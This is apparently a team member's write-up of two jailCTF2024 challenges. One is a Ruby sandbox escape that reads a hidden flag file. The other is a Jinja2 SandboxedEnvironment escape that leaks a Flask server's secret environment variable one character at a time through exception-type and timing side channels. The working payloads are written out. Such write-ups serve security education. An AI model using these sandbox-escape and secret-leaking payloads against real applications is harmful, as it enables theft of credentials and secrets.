# jailCTF2024

I participated in the event as a member of the winning [`chr(sum(range(ord(min(str(not()))))))`](https://ctf.pyjail.club/profile/e8adae37-6507-479b-b3bd-4e0ef3ac6477)
team which was formed by members of the code.golf Discord.

Although I spent time on other challenges too my main contributions were capturing the
`ruby-on-jails` flag (which we were the only team to do successfully) and the `MMM`
flag which was only captured by one other team.

## ruby-on-jails

The key to solving ruby-on-jails was to figure out all the different ways you can call
methods without explicitly calling methods as the challenge code banned these opcodes:
```rb
$banned_opcodes = [ :CALL, :FCALL, :OPCALL, :QCALL, :VCALL, :DXSTR, :XSTR, :ALIAS, :VALIAS ]
```

I was already aware of many different ways to trigger method calls as I have done quite
a bit of creative Ruby coding on [CodinGame](https://www.codingame.com/servlet/urlinvite?u=3893564)
and [code.golf](https://code.golf/). I immediately realized you can use spread operator
on `ARGF` to read lines from files specified in `ARGV`. It just wasn't entirely obvious
how to modify `ARGV` and especially find the right filename, as it included randomized
hexadecimal digits.

The very first thing I did after reading through the challenge was to look up the Ruby parser
source to see all possible token kinds: [rubyparser.h](https://github.com/ruby/ruby/blob/ddbd64400199fd408d23c85f9fb0d7f742ecf9e1/rubyparser.h#L993-L1103).
The first token kind that caught my attention was `super`. I knew I could use it to call methods
from a superclass (and pass different arguments while I'm at it), and since I could already trigger
the `ARGF#readlines` method by doing `[*$<]` I came up with the following to read a file:
```rb
class K < IO
  def self.readlines(*args)
    super("flag.txt")
  end
end
$stdin=K
[*$<]
```
Unfortunately that approach didn't end up working out. The first problem was printing the
result of the read, which I eventually figured out could be done by causing an error that
includes the contents of the file in the message (simplest way to do that is unsuccessful
pattern match with `=> []`). The part that took very long time to figure out was finding
the filename (as the actual name was randomized by using `/dev/urandom`).

Interesting side note: If we were able to call [`IO.readlines("|ls")`](https://ruby-doc.org/3.3.5/IO.html#method-c-readlines)
that would have already given us arbitrary code execution. Unfortunately (for some reason I
still do not quite understand, please let me know if you do!) the behavior is different when
`#readlines` is called with `super("|ls")` from a subclass, and using the pipe character does
**not** do a system call.

After a while a team mate of mine ([@Natanaelel](https://github.com/Natanaelel)) managed to
shorten the partial solution to this:
```rb
ARGV[0]="flag.txt";[*$<]=>[]
```

It all finally clicked the next morning when another team mate ([@MeWhenI](https://github.com/mewheni))
posted this (non-working) version in the team chat where we had been discussing the problem:
```rb
ARGV[0],=Dir["/srv/app/flag-*.txt"];[*$<]=>[]
```
I had played around with `Dir[]` already the previous day inside my `K` class but seeing
it in this context made it click. The reason we were not able to use `Dir[]` is because it
was lacking an assignment! I could just add `||=[]` to make the parser see it as a different
opcode (`:OP_ASGN1`).

Final solution code (with comments) in [ruby-on-jails.rb](ruby-on-jails.rb).

## MMM

In this challenge we are given a Flask application that executes Jinja templates from the user on the fly. To access the flag we must find the value of an environment variable `KEY`. This is the relevant part of the vulnerable application code:
```python
from flask import Flask, render_template, request
from jinja2.sandbox import SandboxedEnvironment
import os
import secrets

app = Flask(__name__)
env = SandboxedEnvironment()

def mean(lst):
    return sum(lst) / len(lst)

def median(lst, high=True):
    lst.sort(key=lambda x: x if high else -x)
    return lst[len(lst)//2]

def mode(lst):
    return max(lst, key=lst.count)

env.filters['mean'] = mean
env.filters['median'] = median
env.filters['mode'] = mode

@app.route('/run', methods=['POST'])
def run():
    try:
        return env.from_string(request.form['template']).render()
    except Exception as e:
        return f'An error occurred! ({e.__class__.__name__})'

@app.route('/flag', methods=['POST'])
def flag():
    if secrets.compare_digest(request.form['key'], os.environ['KEY']):
        with open('flag.txt', 'r') as f:
            return f.read()
    else:
        return 'Invalid key'

if __name__ == '__main__':
	app.run(host='0.0.0.0', port=5000)
```

First thing to note is that the code uses SandboxedEnvironment from jinja2, so we won't be able to access Python variables from outside `env`. We can only use a few things that jinja gives us by default, and the three functions explicitly given to `env` as filters: `mean`, `median`, and `mode`.

### Exploring the environment

I started the investigation by searching for known Jinja2 vulnerabilities. None of what I found was directly applicable to a `SandboxedEnvironment`, but they did give me an idea about the kinds of things you can do. For example you get a handle to more useful functions by looking through dunder attributes of objects you can access (eg. `obj.__globals__`). This would become useful later.

The next thing I did was run the server code locally with a debugger (I like to use [pudb](https://github.com/inducer/pudb)) to see what I have available inside the env. I added a `breakpoint()` inside the `mode` function and ran the server:
```console
$ KEY=abcdef PYTHONBREAKPOINT="pudb.set_trace" python3 server.py
```
I then POSTed a template `{{ 1 | mode }}` to trigger the breakpoint. I spent some time in the debugger walking up the stack and looking at code and variables to find what kinds of functions I have available inside the `mode` function. I found the answer in `environment.globals` a few frames up the stack:
![debugging with pudb](https://github.com/user-attachments/assets/c9a3782c-77d7-42b9-8699-a6112f190753)

I verified that I could indeed use these variables (`range`, `dict`, `lipsum`, `cycler`, `joiner`, `namespace`) by POSTing templates like `{{ namespace | mode }}`. This also allowed me to inspect them in the debugger and figure out what they could do. The most intriguing finding was that I could create namespaces with arbitrarily named attributes. I could set the `.sort` attribute of a `namespace` to anything I wanted, and the `median` function in the application code would then call it:
```jinja
{{ namespace(sort=namespace) | median }}
```
The `median` function would still crash with an error, but I now had a starting point to start crafting an exploit.

### Crafting the exploit

Now the problem was that Jinja syntax doesn't allow you to use the ':' character so I can't just write an arbitrary lambda function to be used as `lst.sort` here:
```python
def median(lst, high=True):
    lst.sort(key=lambda x: x if high else -x)
    return lst[len(lst)//2]
```
However we can see that the sort function is passed a `key` as keyword parameter. This is something that `str.format` can take advantage of:
```python
high = True
# You are likely familiar with f-strings:
f"{key}"
# the above f-string could also be written like this:
"{key}".format(key=key)
# but you can also print properties of "key", and even index into it:
"{key.__globals__[os].environ[KEY]}".format(key=lambda x: x if high else -x)
```
With the above in mind we could craft a template like this to make the median function write the value of `KEY` into the format string:
```jinja
{{ namespace(sort="{key.__globals__[os].environ[KEY]}".format) | median }}
```
But how is this useful if the `median` function does not do anything with the string? It is not stored into any variable, and the function still crashes on the next line when it tries to call `len(lst)`. At first I tried to avoid the crash by crafting a namespace that included attributes like `__len__` (which didn't work). But actually we don't *need* the function to return successfully – if we can somehow affect which error message we get depending on the value of `KEY` we can eventually deduce its entire contents. And we can! The exception handler in the `run` function returns us the class name of the exception. [Python's formatting mini-language](https://docs.python.org/3/library/string.html#formatspec) has lots of different ways to format data – many of which will cause exceptions if you try to use them wrong.

This meant that we could start crafting templates with `sort="{VALUE_SPEC:{FORMAT_SPEC}}".format` and taking note of which exceptions they would cause:
```jinja
{{
  namespace(sort='{key.__closure__[0].cell_contents.smuggled:{key.__globals__[os].environ[KEY][0]}}'.format)
  | median(namespace(smuggled=1))
}}
```
The above template would use the first character of `KEY` as the FORMAT_SPEC, and a value smuggled in through the `high` parameter to the lambda inside `median` as the VALUE_SPEC.

### Finding exceptions in Python's formatting mini-language

From reading the source code we knew the key is 64 hexadecimal digits, so we would need to find ways to distinguish between all characters [0-9a-f]. For some characters like `a` the solution was immediately obvious:
```python
"{:0}".format(42) # => "42"
"{:1}".format(42) # => "42"
# ...
"{:8}".format(42) # => "      42"
"{:9}".format(42) # => "       42"
"{:a}".format(42) # raises ValueError: Unknown format code 'a' for object of type 'int'
"{:b}".format(42) # => "101010"
"{:c}".format(42) # => "*"
"{:d}".format(42) # => "42"
"{:e}".format(42) # => "4.200000e+01"
"{:f}".format(42) # => "42.000000"
```
For others we needed to be bit more clever, but with some help from my team we managed to find enough exceptions to distinguish between all the digits:
* You can only use numbers in the position where the number of decimals is specified (`f"{:.d}"` => ValueError)
* You can't use `,` as a separator in binary/character formatting (`f"{1:,b}"` => ValueError)
* You can't format integers above 0x110000 as characters (`f"{0x110001:c}"` => OverflowError)
* To distinguish between e/f (both of which format floats) we used the fact that `f"{1.0:.2147483647f}"` is *very* slow compared to `f"{1.0:.2147483647e}"`
* To distinguish between the numbers 0-9 we used the fact that Python rejects numbers greater than 2^63-1 in the format spec (I had to dig into [CPython source code](https://github.com/python/cpython/blob/ef530ce7c61dc16387fb68d48aebfbbbfe02adbb/Objects/stringlib/unicode_format.h#L132-L136) for this one):
  - `f"{1:9{2}23372036854775807}"` => MemoryError
  - `f"{1:9{3}23372036854775807}"` => ValueError

[MMM.rb](MMM.rb) contains my final script that used the above tricks to solve the challenge.

> [!NOTE]
> Before realizing that last trick to distinguish between the numbers 0-9 I was experimenting with a timing side channel attack. It takes much longer to format `f"{1:{9}00000}"` than `f"{1:{1}00000}"`. I even started gathering some data (bar chart of timings for each digit in `KEY` below) to see if it was viable. I think it would have probably worked but it would've involved some guesstimating (and a lot more work).
> ![timing bar chart](https://github.com/user-attachments/assets/c91f7508-925f-4bad-b375-072759817665)
